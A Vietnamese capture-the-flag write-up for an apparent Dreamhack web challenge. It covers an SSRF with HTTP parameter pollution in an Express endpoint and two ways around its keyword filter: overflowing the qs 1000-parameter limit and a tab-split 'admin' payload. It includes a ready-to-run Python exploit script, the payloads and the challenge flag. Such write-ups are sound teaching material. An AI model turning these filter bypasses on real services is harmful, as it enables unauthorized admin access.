### Write-up Chi Tiết: Lỗ hổng HTTP Parameter Pollution & giới hạn của Parser

#### 1. Lỗ hổng Cốt lõi: SSRF + HPP

*   **SSRF (Server-Side Request Forgery)**: Lỗ hổng chính nằm ở endpoint `/greet`. Khi chúng ta gửi một tin nhắn, máy chủ không xử lý nó trực tiếp mà lại tạo ra một request mới đến một API nội bộ (`http://localhost:3000/api?msg=...`) và chèn tin nhắn của chúng ta vào URL. Đây là một dạng SSRF, vì chúng ta có thể "giả mạo" một request từ phía máy chủ.
*   **HPP (HTTP Parameter Pollution - Tấn công làm nhiễu tham số)**: Vì `msg` của chúng ta được chèn trực tiếp vào query string, chúng ta có thể thêm các tham số của riêng mình bằng cách sử dụng ký tự `&`. Ví dụ, nếu `msg` là `hello&key=value`, URL sẽ trở thành `.../api?msg=hello&key=value&admin=0`.

#### 2. Trở ngại: Bộ lọc (WAF)

Thử thách đặt ra là endpoint `/greet` có một bộ lọc rất chặt chẽ:
```typescript
if (msg.includes('admin') || msg.includes('\\') || ... )
```
Bộ lọc này ngăn chúng ta chèn trực tiếp tham số `&admin=1` vào `msg`.

#### 3. Hướng Vượt qua: Khai thác giới hạn của thư viện `qs`

Đây là mấu chốt của bài toán. Thay vì cố gắng *thay đổi* giá trị của `admin`, chúng ta sẽ làm cho tham số `&admin=0` ở cuối bị *biến mất hoàn toàn*.

*   Framework Express.js (được sử dụng trong bài này) dùng một thư viện tên là `qs` để phân tích (parse) các query string.
*   Để chống lại các tấn công từ chối dịch vụ (Denial of Service), `qs` có một giới hạn mặc định: **nó chỉ phân tích tối đa 1000 tham số**. Bất kỳ tham số nào từ vị trí thứ 1001 trở đi sẽ bị bỏ qua.

#### 4. Lỗi "Off-by-One" (Sai một ly đi một dặm)

Đây chính là điểm mà bạn gặp khó khăn ban đầu.

*   **Khi bạn gửi 999 tham số (`p0` đến `p998`)**:
    *   URL được tạo ra: `...?msg=p0=...&p998=1&admin=0`
    *   `qs` bắt đầu đếm:
        1.  Tham số #1: `msg`
        2.  Tham số #2 - #999: `p1` đến `p998`
        3.  Tham số #1000: `admin`
    *   Tổng cộng có đúng 1000 tham số. `admin=0` vẫn nằm trong giới hạn và được xử lý. Tấn công thất bại.

*   **Khi bạn gửi 1000 tham số (`p0` đến `p999`)**:
    *   URL được tạo ra: `...?msg=p0=...&p999=1&admin=0`
    *   `qs` bắt đầu đếm:
        1.  Tham số #1: `msg`
        2.  Tham số #2 - #1000: `p1` đến `p999`
        3.  Tham số tiếp theo là `admin`. Đây là **tham số #1001**.
    *   Tham số `admin` đã vượt quá giới hạn 1000 và bị bỏ qua.

Khi `admin` bị bỏ qua, `req.query.admin` trên server sẽ là `undefined`. Đoạn code `Number(undefined)` sẽ trả về `NaN`. Điều kiện `if (isAdmin !== 0)` (tức là `if (NaN !== 0)`) sẽ là `true`, và server trả về FLAG.

---

### Script giải bằng Python

Để chạy script này, bạn cần cài đặt thư viện `requests`:
`pip install requests`

Đây là đoạn code hoàn chỉnh. Bạn chỉ cần chạy nó và nó sẽ tự động lấy flag.

```python
import requests
import sys

# Thay đổi URL này thành URL của bài CTF (lấy từ ảnh chụp màn hình của bạn)
URL = "http://host1.dreamhack.games:14026/greet"

def generate_payload(param_count: int) -> str:
    """
    Tạo ra một chuỗi payload với số lượng tham số được chỉ định.
    Ví dụ: p0=1&p1=1&...
    """
    params = []
    for i in range(param_count):
        # f-string giúp tạo chuỗi 'p0=1', 'p1=1', v.v.
        params.append(f"p{i}=1")
    
    # Nối tất cả các phần tử trong list lại với nhau bằng dấu '&'
    return "&".join(params)

def solve():
    """
    Hàm chính để giải bài CTF.
    """
    print(f"[*] Đang tấn công endpoint: {URL}")

    # Tạo payload chính xác với 1000 tham số để đẩy 'admin' ra vị trí 1001
    param_limit_bypass_payload = generate_payload(1000)
    
    # Dữ liệu POST phải ở dạng JSON, với key là 'msg'
    post_data = {
        "msg": param_limit_bypass_payload
    }

    print("[*] Đã tạo payload với 1000 tham số.")
    print("[*] Đang gửi request POST...")

    try:
        # Gửi request POST với body là JSON
        # Thêm timeout để tránh chờ quá lâu
        response = requests.post(URL, json=post_data, timeout=10)

        # Kiểm tra xem request có thành công không (HTTP 200 OK)
        if response.status_code == 200:
            print("[+] Request thành công!")
            
            # Phân tích kết quả JSON từ server
            data = response.json()
            
            # Lấy giá trị từ key 'result'
            flag = data.get('result')

            if flag:
                print("\n" + "="*40)
                print(f"🎉 FLAG ĐÃ TÌM THẤY: {flag}")
                print("="*40 + "\n")
            else:
                print("[-] Lỗi: Không tìm thấy key 'result' trong response.")
                print(f"    Nội dung response: {response.text}")

        else:
            print(f"[-] Request thất bại với status code: {response.status_code}")
            print(f"    Nội dung response: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Đã xảy ra lỗi mạng: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    solve()
```

#### Giải thích script:

1.  **`import requests`**: Import thư viện để thực hiện các request HTTP.
2.  **`URL`**: Biến chứa địa chỉ của endpoint `/greet`.
3.  **`generate_payload(param_count)`**: Một hàm tiện ích để tạo ra chuỗi payload `p0=1&p1=1&...` với số lượng tham số mong muốn.
4.  **`solve()`**:
    *   Gọi `generate_payload(1000)` để tạo payload chính xác.
    *   Tạo một dictionary `post_data` để định dạng body của request thành JSON `{ "msg": "..." }`.
    *   Sử dụng `requests.post(URL, json=post_data)` để gửi request. Tham số `json=` tự động đặt header `Content-Type` thành `application/json` và chuyển đổi dictionary thành chuỗi JSON.
    *   Kiểm tra `response.status_code` để đảm bảo request thành công.
    *   Dùng `response.json()` để phân tích chuỗi JSON trả về thành một dictionary Python.
    *   Lấy giá trị của key `result` (đây chính là flag) và in ra màn hình.
    *   Khối `try...except` dùng để bắt các lỗi kết nối mạng có thể xảy ra.

> Flag: `null{D0_u_kn0w_expre3S_qu3ry_1i2it?}`


---

### Lỗ hổng: Sự khác biệt trong việc "Chuẩn hóa URL" (URL Normalization)

Lỗ hổng này khai thác sự khác biệt trong cách xử lý các ký tự đặc biệt (cụ thể là ký tự Tab `\t`) giữa hai thành phần:

1.  **Bộ lọc (WAF)** của ứng dụng tại endpoint `/greet`.
2.  **Thư viện HTTP client (`axios`)** ở phía máy chủ, nơi thực hiện request SSRF.

Hãy đi qua từng bước của cuộc tấn công với payload `1&a\tdmin=1`.

#### Bước 1: Vượt qua Bộ lọc (WAF)

-   **Payload của bạn**: `1&a\tdmin=1` (ở đây, `\t` là một ký tự Tab thật sự, không phải hai ký tự `\` và `t`).
-   **Code bộ lọc**: `if (msg.includes('admin') || ...)`
-   **Phân tích**: Hàm `msg.includes('admin')` thực hiện một phép so sánh chuỗi ký tự đơn giản. Chuỗi `"a\tdmin"` có một ký tự Tab ở giữa, vì vậy nó **KHÔNG** giống với chuỗi `"admin"`. Kết quả là `includes()` trả về `false`.
-   **Kết quả**: Payload của bạn đã thành công vượt qua bộ lọc.

#### Bước 2: Phép màu của Chuẩn hóa URL (URL Normalization)

-   **Code phía máy chủ**: `const resp = await axios.get(\`http://localhost:3000/api?msg=${msg}&admin=0\`);`
-   **URL được tạo ra**: `http://localhost:3000/api?msg=1&a\tdmin=1&admin=0`
-   **Phân tích**: Khi `axios` (hoặc thực chất là bộ phân tích URL của Node.js mà `axios` sử dụng) nhận được chuỗi URL này, nó sẽ thực hiện một quá trình gọi là **chuẩn hóa (normalization)** trước khi gửi request đi. Quy trình này nhằm mục đích làm "sạch" URL và đưa nó về một dạng chuẩn. Một trong những quy tắc chuẩn hóa phổ biến là **loại bỏ các ký tự whitespace và các ký tự điều khiển không thể in ra được**, chẳng hạn như:
    -   Tab (`\t`, `\x09`)
    -   Newline (`\n`, `\x0a`)
    -   Carriage return (`\r`, `\x0d`)
    -   Các ký tự như `\x01`, `\x04`...
-   **Kết quả**: Trong quá trình chuẩn hóa, ký tự Tab (`\t`) trong `a\tdmin` bị loại bỏ. Chuỗi `"a\tdmin"` biến thành `"admin"`.

#### Bước 3: HTTP Parameter Pollution (HPP) một lần nữa

Sau khi chuẩn hóa, URL mà `axios` thực sự gửi đến endpoint `/api` là:
`http://localhost:3000/api?msg=1&admin=1&admin=0`

Bây giờ, endpoint `/api` nhận được một query string với **hai tham số `admin`**. Cách Express.js/`qs` xử lý việc này là:

-   Nó sẽ tạo ra một mảng: `req.query.admin` sẽ trở thành `['1', '0']`.
-   Tiếp theo, code thực thi `const isAdmin = Number(req.query.admin);`.
-   Trong JavaScript, khi bạn áp dụng hàm `Number()` cho một mảng có nhiều hơn một phần tử (như `['1', '0']`), kết quả sẽ là `NaN` (Not a Number).
-   Cuối cùng, điều kiện `if (isAdmin !== 0)` (tức `if (NaN !== 0)`) được kiểm tra. Vì `NaN` không bằng bất cứ thứ gì (kể cả chính nó), điều kiện này luôn đúng.
-   Và FLAG được trả về!

### So sánh hai lời giải

1.  **Lời giải Parameter Limit Overflow (999+ tham số)**:
    -   **Cách hoạt động**: Khai thác một giới hạn kiến trúc của parser (`qs`).
    -   **Ưu điểm**: Hoạt động bất kể việc xử lý ký tự đặc biệt như thế nào.
    -   **Nhược điểm**: Payload rất dài, "ồn ào" và cần biết chính xác giới hạn của parser.

2.  **Lời giải URL Normalization (Dùng ký tự Tab)**:
    -   **Cách hoạt động**: Khai thác sự mâu thuẫn trong logic phân tích (parsing inconsistency) giữa hai lớp của ứng dụng.
    -   **Ưu điểm**: Payload cực kỳ ngắn, gọn gàng, tinh vi và khó bị phát hiện.
    -   **Nhược điểm**: Chỉ hoạt động khi có sự khác biệt trong cách xử lý của bộ lọc và bộ parser phía sau.